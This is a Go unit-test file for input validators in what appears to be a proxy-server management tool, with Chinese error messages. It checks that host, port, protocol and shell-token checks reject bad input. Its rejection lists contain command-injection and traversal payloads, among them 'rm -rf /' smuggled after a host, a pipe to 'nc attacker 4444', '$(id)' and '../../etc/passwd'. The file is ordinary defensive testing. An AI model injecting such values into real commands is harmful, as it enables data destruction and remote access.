package validate

import "testing"

func TestHostRejectsInjectionPayloads(t *testing.T) {
	bad := []string{
		"1.1.1.1; rm -rf /",
		"1.1.1.1 && reboot",
		"1.1.1.1|nc attacker 4444",
		"`id`",
		"$(id)",
		"host\nrm -rf /",
		"host name",
		"../../etc/passwd",
		"1.1.1.1'\"",
		"",
		"a..b",
	}
	for _, h := range bad {
		if err := Host(h); err == nil {
			t.Errorf("恶意/非法主机应被拒绝: %q", h)
		}
	}
}

func TestHostAcceptsRealValues(t *testing.T) {
	good := []string{
		"127.0.0.1", "example.com", "vps-01.example.com", "2001:db8::1",
		"[2001:db8::1]", "sub_domain.example.co.uk", "10.0.0.1",
	}
	for _, h := range good {
		if err := Host(h); err != nil {
			t.Errorf("合法主机被误拒: %q (%v)", h, err)
		}
	}
}

func TestPortBoundaries(t *testing.T) {
	for _, p := range []int{-1, 0, 65536, 100000} {
		if err := Port(p); err == nil {
			t.Errorf("越界端口应被拒绝: %d", p)
		}
	}
	for _, p := range []int{1, 443, 65535} {
		if err := Port(p); err != nil {
			t.Errorf("合法端口被误拒: %d (%v)", p, err)
		}
	}
}

func TestProtocolWhitelist(t *testing.T) {
	for _, p := range []string{"vless", "vmess", "shadowsocks", "socks", "http"} {
		if err := Protocol(p); err != nil {
			t.Errorf("白名单协议被拒: %s", p)
		}
	}
	for _, p := range []string{"", "bash", "vless; id", "../../x"} {
		if err := Protocol(p); err == nil {
			t.Errorf("非法协议应被拒绝: %q", p)
		}
	}
}

func TestShellSafeToken(t *testing.T) {
	for _, s := range []string{"x86_64", "vps-01", "2001:db8::1"} {
		if !ShellSafeToken(s) {
			t.Errorf("应视为安全 token: %q", s)
		}
	}
	for _, s := range []string{"", "a b", "a;b", "a$(id)", "a|b"} {
		if ShellSafeToken(s) {
			t.Errorf("不应视为安全 token: %q", s)
		}
	}
}
